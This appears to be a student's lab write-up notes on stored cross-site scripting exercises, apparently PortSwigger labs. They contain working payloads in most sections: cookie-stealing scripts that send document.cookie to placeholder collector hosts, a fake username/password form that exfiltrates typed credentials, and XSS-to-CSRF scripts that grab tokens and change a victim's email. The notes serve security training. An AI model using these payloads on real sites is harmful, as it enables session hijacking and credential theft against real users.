
#### 1.x. Lab: Stored XSS into HTML context with nothing encoded ⭕️
This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.
1. Click on a blog post > right click > Inspect on one of the comments > notice the comments are wrapped in a `<p>` tag. So, our payload have to start with `</p>` to break out of it.
2. Use this payload: `</p><script>alert(1)</script>` and we broke out of it. Lab solved. You'll see the alert once you go back to the blog post.
	1. ![XSS-20260126204238776](XSS-20260126204238776.png)
	2. ![258](XSS-20260126204019466.png)
>[!tip] How to Identify this Vulnerability
>1. Functionality that allows stored user input e.g., comment

**Post this exploit as a comment**
```
# document.location example
</p><script>document.location='https://OASTIFY.COM/?p='+document.cookie</script>

# fetch example
</p><script>fetch('https://OASTIFY.COM/?p='+document.cookie);</script>
```

---

#### 1.x. Lab: Exploiting cross-site scripting to steal cookies ⭕️
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

1. Go to a blog post and enter the following payload (replace the link with your Collaborator URL) #Useful 
```
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
2. Submit the comment and Poll Collaborator and there's a HTTP request to Collaborator from the victim with their session cookie
	1. ![XSS-20260106194318333](XSS-20260106194318333.png)
3. Copy and paste it in Cookie Editor, save, click on My Account and solved.

#ExamTip Use the following payloads to identify Stored XSS
```
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```

**Post a exploit as a comment**
```
<script> fetch('https://OASTIFY.COM', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<img src="1" onerror="window.location='https://OASTIFY.COM/cookie='+document.cookie">

<script>
document.write('<img src="https://OASTIFY.COM?cookieStealer='+document.cookie+'" />');
</script>
```

**Product and Store Lookup**:
`?productId=1&storeId="></select><img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>`
>How is this stored XSS? #TODO

##### Alternate Solution
Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
1. Paste the payload below in the comment section of the blog. **Ensure to replace `postId` with the correct Id**.
2. Then next time either you or the victim visits the page, it will invoke a `POST` request to submit a comment with their session cookie on it.
	1. Since the lab below has HttpOnly, I made a cookie `test_cookie` with no HttpOnly to demonstrate it working.
	2. ![384](Stored%20XSS-20260204223706651.png)

#Useful 
So this script visits the `/my-account` page to grab the victim's `csrf` token, then uses that token to post a comment with their session cookie on it. **If their session cookie has HttpOnly, this will NOT work**.
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
    var cookie = document.cookie;

    var commentReq = new XMLHttpRequest();
    commentReq.open('POST', '/post/comment', true);
    commentReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    commentReq.send(
        'csrf=' + token +
        '&postId=10' +
        '&comment=' + encodeURIComponent("Cookie: " + cookie) +
        '&name=aaa&email=nah%40nah.com&website=https%3A%2F%2Fwww.qqq.com'
    );
}
</script>
```
---

#### 1.x. Lab: Exploiting XSS to bypass CSRF defenses ⭕️
#Useful 
- The normal solution exfiltrates the cookie to you (attacker) but there is another way
- Exploit CSRF via XSS **making the victim post their cookie as a comment**
- This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
- You can log in to your own account using the following credentials: `wiener:peter`

1. Login with `wiener:peter` and check the page source (or http response) of `/my-account?id=wiener`. Notice that the function of the Update email feature here (as a POST request) and has a hidden field: *csrf value*. 
	1. ![XSS-20260106200145478](XSS-20260106200145478.png)
2. Copy and paste this payload in a blog post comment, every time a victim visits that blog, this will happen:
	1. Load the `/my-account` endpoint
	2. Grab the value of the **csrf token** from the HTTP response
	3. Invoke a POST method on the `/my-account/change-email` endpoint and change the email to `test@test.com`

**Post exploit as a comment**
```
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```

- - - 

#### 1.x. Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded ⭕️
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
1. Submit a comment > notice the author name is a hyperlink to the website field.
	1. ![XSS-20260126214155314](XSS-20260126214155314.png)
	2. ![XSS-20260126214140368](XSS-20260126214140368.png)
2. #Useful  Enter this payload to the website field to solve: `javascript:alert(1)`
	1. ![XSS-20260126214512308](XSS-20260126214512308.png)
>Notice you need don't double quotes to escape. Turns out `javascript:` can run within HTML attributes. Also, the website field did not validate the input is an URL or not

>[!tip] How to Identify this Vulnerability
>1. Comment feature
>2. Website field doesn't have any validation (e.g., check if input is an URL)
>3. User input field turns to a hyperlink (e.g., author name linking to website)

**Post exploits as a comment**
```
javascript:fetch('https://OASTIFY.COM?c='+document.cookie)

javascript:document.location='https://OASTIFY.COM/?c='+document.cookie
```

---

#### 1.x. Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped ⭕️
This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
1. Click on a blog, submit a comment, and notice the author name is a hyperlink to the website field.
	1. ![XSS-20260127163753560](XSS-20260127163753560.png)
2. Right click on the author name > Inspect > and notice we can try to break out of the `onclick` attribute.
	1. ![XSS-20260127163910647](XSS-20260127163910647.png)
3. The website field has client side validation to check if the input is an URL or not. Can't do it in Repeater either to bypass client side validation.
	1. ![313](XSS-20260127164153095.png)
4. Must include a URL in the website field along with a payload but angle brackets are HTML encoded.
	1. ![XSS-20260127164510941](XSS-20260127164510941.png)
5. Enter this payload to solve: `http://foo?&apos;-alert(1)-&apos;` or `http://foo?&#39;-alert(1)-&#39;` where the single quote must be HTML encoded.
	1. ![XSS-20260127164922627](XSS-20260127164922627.png)
	2. It looks like `'-alert(1)-'`

>Guess you only need `-` wrapped around your JS payload without `<script>` tags.

>[!tip] How to Identify this Vulnerability
>1. Comment feature
>2. Author name becomes a hyperlink
>3. User input is inside an `onclick` attribute

**Post as comment**
`'` was escaped so use html or xml encoding 
```
# HTML encode key characters
http://foo?&apos;-fetch(&apos;https://OASTIFY.COM/?p=&apos;+document.cookie)-&apos;

http://foo?&apos;-document.location=&apos;https://OASTIFY.COM/?p=&apos;+document.cookie-&apos;


# XML encode using https://www.zickty.com/xmldecode
http://foo?&#39;-fetch(&#39;https://OASTIFY.COM/?p=&#39;+document.cookie)-&#39;

http://foo?&#39;-document.location=&#39;https://OASTIFY.COM/?p=&#39;+document.cookie-&#39;
```

---

#### 1.x. Lab: Exploiting cross-site scripting to capture passwords ⭕️
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
1. Enter a simple XSS payload in the Comment field and send and notice we have stored XSS. E.g., `<b onmouseover=alert(1)>Hover over me!</b>`
	1. ![XSS-20260127170353479](XSS-20260127170353479.png)
	2. ![271](XSS-20260127170405773.png)
2. Enter the following payload > paste in your Burp Collaborator domain > post comment > poll burp collaborator > notice the creds > login and solve.
	1. ![XSS-20260127171255989](XSS-20260127171255989.png)
	2. What the payload does is it will invoke the `fetch` method once there is a length in the password field (like a user starts typing). It's essentially creating 2 fields, user enter creds into the fields, and then gets sent to burp collaborator.
```
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

>[!tip] How to Identify this Vulnerability
>1. Comment feature doesn't have validation for angle brackets or anything XSS related

>[!info] Post User Creds via CSRF
>This lab can also be solved using CSRF to post the user's creds as a comment. #Useful 

**Post as comment**
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```